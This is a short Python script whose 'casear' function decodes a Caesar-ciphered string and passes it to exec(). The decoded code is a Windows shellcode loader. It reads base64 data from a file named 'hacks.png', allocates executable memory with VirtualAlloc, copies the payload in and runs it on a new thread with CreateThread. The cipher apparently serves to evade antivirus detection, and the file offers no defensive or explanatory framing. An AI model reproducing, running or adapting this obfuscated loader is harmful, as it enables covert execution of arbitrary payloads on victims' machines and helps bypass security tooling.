#coding:utf-8
import base64
import ctypes
import codecs

def casear():
    encrypted_content = """
lpsruw edvh64
lpsruw fwbshv
lpsruw frghfv

zlwk rshq("kdfnv.sqj", "ue") dv i:
    hqfrghg_gdwd = i.uhdg()

ghfrghg_gdwd = edvh64.e64ghfrgh(hqfrghg_gdwd)
gdwd_exiihu = ebwhduudb(frghfv.hvfdsh_ghfrgh(ghfrghg_gdwd)[0])

fwbshv.zlqgoo.nhuqho32.YluwxdoDoorf.uhvwbsh = fwbshv.f_xlqw64

doorfdwhg_phprub_dgguhvv = fwbshv.zlqgoo.nhuqho32.YluwxdoDoorf(fwbshv.f_lqw(0),
                                                               fwbshv.f_lqw(ohq(gdwd_exiihu)),
                                                               fwbshv.f_lqw(0a3000),
                                                               fwbshv.f_lqw(0a40))
exiihu = (fwbshv.f_fkdu * ohq(gdwd_exiihu)).iurp_exiihu(gdwd_exiihu)

fwbshv.zlqgoo.nhuqho32.UwoPryhPhprub(
    fwbshv.f_xlqw64(doorfdwhg_phprub_dgguhvv),
    exiihu,
    fwbshv.f_lqw(ohq(gdwd_exiihu))
)

fuhdwhg_wkuhdg_kdqgoh = fwbshv.zlqgoo.nhuqho32.FuhdwhWkuhdg(
    fwbshv.f_lqw(0),
    fwbshv.f_lqw(0),
    fwbshv.f_xlqw64(doorfdwhg_phprub_dgguhvv),
    fwbshv.f_lqw(0),
    fwbshv.f_lqw(0),
    fwbshv.srlqwhu(fwbshv.f_lqw(0))
)

fwbshv.zlqgoo.nhuqho32.ZdlwIruVlqjohRemhfw(fwbshv.f_lqw(fuhdwhg_wkuhdg_kdqgoh), fwbshv.f_lqw(-1))
    """
    shift = 3
    decrypted_content = ""
    for char in encrypted_content:
        if char.isalpha():
            char_code = ord(char)
            if char.islower():
                decrypted_char = chr((char_code - ord('a') - shift) % 26 + ord('a'))
            else:
                decrypted_char = chr((char_code - ord('A') - shift) % 26 + ord('A'))
        else:
            decrypted_char = char
        decrypted_content += decrypted_char
    exec(decrypted_content)